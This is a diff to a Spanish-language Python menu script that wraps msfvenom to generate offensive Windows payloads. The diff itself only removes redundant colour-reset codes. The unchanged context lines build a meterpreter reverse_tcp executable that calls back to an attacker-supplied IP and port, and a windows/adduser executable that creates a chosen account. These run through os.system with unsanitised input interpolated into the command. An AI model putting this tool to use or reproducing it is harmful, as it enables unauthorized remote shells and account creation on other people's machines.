@@ -24,13 +24,13 @@ def msf_windows():
 \033[31m                   ░ ░     \033[34m                            ░     
 '''
     print(title)
-    print(color.BLUE + color.RESET + '[#] Ingresa la tu IP.')
+    print(color.BLUE + '[#] Ingresa la tu IP.')
     attack_ip = input(color.RED + color.RESET + f'[{name}] -->  ')
 
-    print(color.BLUE + color.RESET + '\n[#] Ingresa el puerto.')
-    port = input(color.RED + color.RESET + f'[{name}] -->  ')
+    print(color.BLUE + '\n[#] Ingresa el puerto.')
+    port = input(color.RED + f'[{name}] -->  ')
 
-    print(color.BLUE + color.RESET + '[#] Generando...')
+    print(color.BLUE + '[#] Generando...')
     print('[#]> ---------------------------------------------------------------------------- <[#]')
     os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={attack_ip} LPORT={port} -f exe > windows.exe')
     print('[#]> ---------------------------------------------------------------------------- <[#]')
@@ -51,18 +51,18 @@ def msf_user():
 '''
     print(title)
 
-    print(color.BLUE + color.RESET + '[#] Ingresa el nombre de usuario a añadir.')
-    user = input(color.RED + color.RESET + f'[{name}] -->  ')
+    print(color.BLUE + '[#] Ingresa el nombre de usuario a añadir.')
+    user = input(color.RED + f'[{name}] -->  ')
 
-    print(color.BLUE + color.RESET + '\n[#] Ingresa la contraseña de dicho usuario.')
-    password = input(Fore.RED + Back.RESET + f'[{name}] -->  ')
+    print(color.BLUE + '\n[#] Ingresa la contraseña de dicho usuario.')
+    password = input(color.RED + f'[{name}] -->  ')
 
-    print(color.BLUE + color.RESET + '[#] Generando...')
+    print(color.BLUE + '[#] Generando...')
     print('[#]> ---------------------------------------------------------------------------- <[#]')
     os.system(f'msfvenom -p windows/adduser USER={user} PASS={password} -f exe > adduser.exe')
     print('[#]> ---------------------------------------------------------------------------- <[#]')
-    print(color.BLUE + color.RESET + 'Presiona ENTER para volver al menú.')
-    choice = input(color.RED + color.RESET + f'[{name}] -->  ')
+    print(color.BLUE + 'Presiona ENTER para volver al menú.')
+    choice = input(color.RED + f'[{name}] -->  ')
     menu()
 
 
@@ -101,13 +101,13 @@ def menu():
     [02]: Generar payload con msfvenom para Windows.
     [03]: Añadir usuario en Windows con msfvenom.
     '''
-    print(color.BLUE + color.RESET + options)
+    print(color.BLUE + options)
 
-    choice = input(color.RED + color.RESET + f'[{name}] -->  ')
+    choice = input(color.RED + f'[{name}] -->  ')
 
     if choice == '00':
         os.system('clear')
-        print(color.RESET + color.RESET)
+        print(color.RESET)
         sys.exit()
 
     elif choice == '01':
@@ -121,7 +121,7 @@ def menu():
 
     else:
         print(color.BLUE + color.RESET + '\n[#] Error: Command not found. Presiona ENTER para volver al menú.')
-        choice = input(color.RED + color.RESET + f'[{name}] -->  ')
+        choice = input(color.RED + f'[{name}] -->  ')
         menu()
 
 menu()
